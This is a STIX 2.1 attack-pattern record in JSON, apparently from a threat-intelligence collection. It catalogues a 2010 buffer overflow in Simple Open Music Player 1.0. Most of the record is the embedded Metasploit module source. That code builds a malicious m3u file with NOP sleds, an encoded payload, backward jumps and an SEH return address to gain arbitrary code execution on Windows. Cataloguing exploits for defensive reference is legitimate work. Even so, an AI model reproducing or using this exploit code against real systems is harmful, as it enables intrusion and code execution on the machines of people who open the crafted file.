{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--51e903eb-cb21-4f04-b69e-7651cdc6dc44",
    "created": "2024-08-14T16:36:23.414082Z",
    "modified": "2024-08-14T16:36:23.414086Z",
    "name": "S.O.M.P.L 1.0 Player Buffer Overflow",
    "description": " This module exploits a buffer overflow in Simple Open Music Player v1.0. When the application is used to import a specially crafted m3u file, a buffer overflow occurs allowing arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/somplplayer_m3u.rb",
            "external_id": "somplplayer_m3u.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'S.O.M.P.L 1.0 Player Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Simple Open Music Player v1.0. When\n        the application is used to import a specially crafted m3u file, a buffer overflow occurs\n        allowing arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Rick2600',  # Original Exploit\n          'dookie'     # MSF Module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '64368' ],\n          [ 'EDB', '11219' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\",\n          'StackAdjustment' => -3500\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x32501B07 } ],        # p/p/r in Fcc3250mt.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-01-22',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),\n      ])\n\n  end\n\n  def exploit\n\n    sploit = make_nops(5)\n    sploit << payload.encoded\n    sploit << make_nops(4138 - (payload.encoded.length))\n    sploit << \"\\xE9\\xCD\\xEF\\xFF\\xFF\"\t# Jump back to our nops\n    sploit << \"\\xEB\\xF9\\x90\\x90\"\t\t# Short jump back\n    sploit << [target.ret].pack('V')\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-22",
    "x_mitre_platforms": [
        "win'"
    ]
}